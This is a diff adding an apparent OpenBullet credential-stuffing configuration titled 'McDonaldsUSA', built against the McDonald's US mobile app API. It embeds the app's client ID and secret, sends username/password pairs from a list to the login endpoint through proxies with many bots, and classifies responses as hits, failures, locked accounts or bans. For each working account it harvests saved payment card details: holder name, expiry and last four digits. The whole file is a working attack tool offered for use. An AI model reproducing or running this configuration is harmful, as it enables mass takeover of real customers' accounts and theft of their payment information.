@@ -1,0 +1,148 @@
+[SETTINGS]
+{
+  "Name": "McDonaldsUSA",
+  "SuggestedBots": 150,
+  "MaxCPM": 0,
+  "LastModified": "2019-09-22T05:22:16.9619142+03:00",
+  "AdditionalInfo": "USA PROXIES",
+  "Author": "YungChef",
+  "Version": "1.1.3",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+BEGIN SCRIPT JavaScript
+function S4() {
+    return (((1+Math.random())*0x10000)|0).toString(16).substring(1); 
+}
+// then to call it, plus stitch in '4' in the third group
+guid = (S4() + S4() + "-" + S4() + "-4" + S4().substr(0,3) + "-" + S4() + "-" + S4() + S4() + S4()).toLowerCase();
+guid = guid;
+END SCRIPT -> VARS "guid"
+
+REQUEST POST "https://us-prod.api.mcd.com/v1/security/auth/token" 
+  CONTENT "grantType=client_credentials" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "mcd-clientid: 8cGckR5wPgQnFBc9deVhJ2vT94WhMBRL" 
+  HEADER "authorization: Basic OGNHY2tSNXdQZ1FuRkJjOWRlVmhKMnZUOTRXaE1CUkw6WW00clZ5cXBxTnBDcG1yZFBHSmF0UnJCTUhoSmdyMjY=" 
+  HEADER "mcd-clientsecret: Ym4rVyqpqNpCpmrdPGJatRrBMHhJgr26" 
+  HEADER "cache-control: true" 
+  HEADER "accept-charset: UTF-8" 
+  HEADER "User-Agent: MCDSDK/1.1.42 (iPhone; 12.4.1; en-US) GMA/5.0" 
+  HEADER "accept-language: en-US" 
+  HEADER "mcd-sourceapp: GMA" 
+  HEADER "mcd-uuid: <guid>" 
+  HEADER "mcd-marketid: US" 
+  HEADER "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "Host: us-prod.api.mcd.com" 
+
+#token PARSE "<SOURCE>" JSON "token" -> VAR "token" 
+
+#POST REQUEST POST "https://us-prod.api.mcd.com/exp/v1/customer/login" 
+  CONTENT "{\"credentials\":{\"type\":\"email\",\"loginUsername\":\"<USER>\",\"password\":\"<PASS>\"}}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: us-prod.api.mcd.com" 
+  HEADER "mcd-sourceapp: GMA" 
+  HEADER "Accept: application/json" 
+  HEADER "Authorization: Bearer <token>" 
+  HEADER "accept-charset: utf-8" 
+  HEADER "mcd-clientid: 8cGckR5wPgQnFBc9deVhJ2vT94WhMBRL" 
+  HEADER "Accept-Encoding: gzip;q=1.0, *;q=0.5" 
+  HEADER "Cache-Control: true" 
+  HEADER "Accept-Language: en-US" 
+  HEADER "Content-Type: application/json" 
+  HEADER "mcd-uuid: <guid>" 
+  HEADER "mcd-marketid: US" 
+  HEADER "User-Agent: MCDSDK/1.1.42 (iPhone; 12.4.1; en-US) GMA/5.0" 
+  HEADER "mcd-clientsecret: Ym4rVyqpqNpCpmrdPGJatRrBMHhJgr26" 
+  HEADER "X-NewRelic-ID: UwUDUVNVGwIGVVRTDwgDVQ==" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "record not found" 
+    KEY "incorrect password.\"," 
+    KEY "Invalid Credentials" 
+    KEY "Please use social login" 
+    KEY "Login request failed" 
+  KEYCHAIN Success OR 
+    KEY "Login is successful" 
+  KEYCHAIN Retry OR 
+    KEY "<SOURCE>" DoesNotExist 
+    KEY "Backend service not configured, contact Middleware team" 
+    KEY "502 Bad Gateway" 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "The account is inactive" 
+    KEY "Reset password has been initiated for this account and the action has not been completed" 
+    KEY "The Account with provided LoginUsername has not been verified" 
+    KEY "The account has not been verifie" 
+    KEY "Account has been locked" 
+  KEYCHAIN Ban OR 
+    KEY "Access Denied" 
+    KEY "API calls exceeded" 
+
+PARSE "<SOURCE>" JSON "accessToken" -> VAR "TOKEN" 
+
+REQUEST GET "https://us-prod.api.mcd.com/exp/v1/order/payments" 
+  
+  HEADER "Authorization: Bearer <TOKEN>" 
+  HEADER "Host: us-prod.api.mcd.com" 
+  HEADER "mcd-sourceapp: GMA" 
+  HEADER "Accept: application/json" 
+  HEADER "accept-charset: utf-8" 
+  HEADER "mcd-clientid: 8cGckR5wPgQnFBc9deVhJ2vT94WhMBRL" 
+  HEADER "Accept-Encoding: gzip;q=1.0, *;q=0.5" 
+  HEADER "Cache-Control: true" 
+  HEADER "Accept-Language: en-US" 
+  HEADER "Content-Type: application/json" 
+  HEADER "mcd-uuid: <guid>" 
+  HEADER "mcd-marketid: US" 
+  HEADER "User-Agent: MCDSDK/1.1.42 (iPhone; 12.4.1; en-US) GMA/5.0" 
+  HEADER "mcd-clientsecret: Ym4rVyqpqNpCpmrdPGJatRrBMHhJgr26" 
+  HEADER "X-NewRelic-ID: UwUDUVNVGwIGVVRTDwgDVQ==" 
+
+PARSE "<SOURCE>" JSON "paymentCards" -> VAR "paymentCards" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "<paymentCards>" EqualTo "[]" 
+
+PARSE "<paymentCards>" JSON "cardHolderName" Recursive=TRUE -> VAR "1" 
+
+PARSE "<paymentCards>" JSON "cardExpiration" Recursive=TRUE -> VAR "2" 
+
+PARSE "<paymentCards>" JSON "cardAlias" Recursive=TRUE -> VAR "3" 
+
+PARSE "<paymentCards>" JSON "isExpired" Recursive=TRUE -> VAR "4" 
+
+FUNCTION Constant "Card Type : <1[*]> | Card Expire : <2[*]> | Last Four Digits : <3[*]> | Expired : <4[*]>" -> CAP "Payment Methods" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "<4[*]>" EqualTo "True" 
+  KEYCHAIN Success OR 
+    KEY "<4[*]>" EqualTo "False" 
+
+FUNCTION Replace ", " "\\n" "<Payment Methods>" -> VAR "ouput" 
+
+FUNCTION Replace "[" "" "<ouput>" -> VAR "1" 
+
+FUNCTION Replace "]" "" "<1>" -> VAR "2" 
+
